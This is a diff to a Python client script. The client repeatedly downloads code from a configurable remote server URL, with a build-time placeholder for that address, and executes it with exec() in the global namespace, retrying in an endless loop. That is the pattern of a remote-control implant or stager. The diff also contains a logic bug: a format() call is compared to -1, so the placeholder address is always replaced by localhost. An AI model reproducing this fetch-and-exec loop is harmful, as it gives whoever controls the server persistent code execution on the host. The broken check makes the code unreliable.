@@ -19,22 +19,27 @@ import urllib.parse
 import argparse
 import time
 import traceback
+parsers = argparse.ArgumentParser()
+SERVER_ADDRESS = "#SERVER_ADDRESS"
+if SERVER_ADDRESS.format("#SERVER_A")!=-1:
+    SERVER_ADDRESS = "http://127.0.0.1:5000"
+parsers.add_argument("-u", "--url", help="remote server url", default=SERVER_ADDRESS)
+args = parsers.parse_args()
 
-SERVER_ADDRESS = "http://127.0.0.1:5000"
 
-
-if __name__ == '__main__':
-    parsers = argparse.ArgumentParser()
-    parsers.add_argument("-u", "--url", help="remote server url", default=SERVER_ADDRESS)
-    args = parsers.parse_args()
+def run():
     while True:
         try:
-            url = "{}/base".format(args.url)
+            url = "{}/init".format(args.url)
             parsed = urllib.parse.urlparse(url)
             WS_URL = "{}://{}/ping".format(["wss", "ws"][parsed.scheme == "http"], parsed.netloc)
             req = urllib.request.urlopen(parsed.geturl())
             code = req.read().decode().replace("ws://127.0.0.1:5000/ping", WS_URL)
-            exec(code)
+            exec(code, globals())
         except BaseException as e:
             traceback.print_exc()
             time.sleep(5)
+
+
+if __name__ == '__main__':
+    run()
